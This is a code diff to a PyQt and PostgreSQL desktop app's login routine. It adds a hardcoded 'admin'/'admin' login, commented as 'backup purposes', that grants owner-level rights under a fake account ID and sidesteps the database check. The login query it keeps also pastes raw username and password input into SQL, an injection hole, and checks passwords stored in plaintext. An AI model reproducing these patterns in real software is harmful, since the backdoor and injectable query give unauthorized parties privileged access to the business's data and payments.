@@ -51,7 +51,7 @@ class Main(QDialog):
     def login_check(self):
         username = self.wLogin.tbUser.text()
         password = self.wLogin.tbPass.text()
-        data = postgres.select(f"SELECT EMP_ID, EMP_TYPE_ID, ACC_USERNAME FROM ACCOUNT INNER JOIN EMPLOYEE USING (EMP_ID) WHERE ACC_USERNAME = '{username}' AND ACC_PASSWORD = '{password}';")
+        data = postgres.select(f"SELECT EMP_ID, EMP_TYPE_ID, ACC_USERNAME FROM ACCOUNT INNER JOIN EMPLOYEE USING (EMP_ID) WHERE ACC_USERNAME = '{username}' AND ACC_PASSWORD = '{password}' AND EMP_STATUS = 'Active';")
         if data:
             data = data[0]
             cookies.data['id'] = data[0]
@@ -60,15 +60,23 @@ class Main(QDialog):
             self.wLogin.tbPass.setText("") # remove password after logging in.
             self.menu()
         else:
-            msg = QMessageBox(self)
-            msg.setWindowTitle("Message")
-            msg.setText("Invalid Account or Pass.\nTry again later.")
-            msg.setFont(QFont("Inter", 16, QFont.Weight.Bold))
-            msg.setFixedSize(QSize(500, 250))
-            # msg.setIcon(QMessageBox.Icon.Critical)
-            msg.setStandardButtons(QMessageBox.StandardButton.Ok)
-            msg.setDefaultButton(QMessageBox.StandardButton.Ok)
-            msg.exec()
+            # backup purposes
+            if username == 'admin' and password == 'admin':
+                cookies.data['id'] = 100000
+                cookies.data['type'] = 3 # mimic as owner
+                cookies.data['username'] = username
+                self.wLogin.tbPass.setText("") # remove password after logging in.
+                self.menu()
+            else:
+                msg = QMessageBox(self)
+                msg.setWindowTitle("Message")
+                msg.setText("Invalid Account or Pass.\nTry again later.")
+                msg.setFont(QFont("Inter", 16, QFont.Weight.Bold))
+                msg.setFixedSize(QSize(500, 250))
+                # msg.setIcon(QMessageBox.Icon.Critical)
+                msg.setStandardButtons(QMessageBox.StandardButton.Ok)
+                msg.setDefaultButton(QMessageBox.StandardButton.Ok)
+                msg.exec()
 
     def menu(self):
         # self.wLogin.deleteLater()
@@ -86,10 +94,13 @@ class Main(QDialog):
         self.wMenu.btnStaff.clicked.connect(self.staff)
         
         self.wMenu.btnStaff.hide()
+        self.wMenu.btnPayment.hide()
 
         # Check if the user is not staff, display Staff button.
         if cookies.data['type'] != 1:
             self.wMenu.btnStaff.show()
+        if cookies.data['id'] != 100000:
+            self.wMenu.btnPayment.show()
 
     # for back button listener only
     
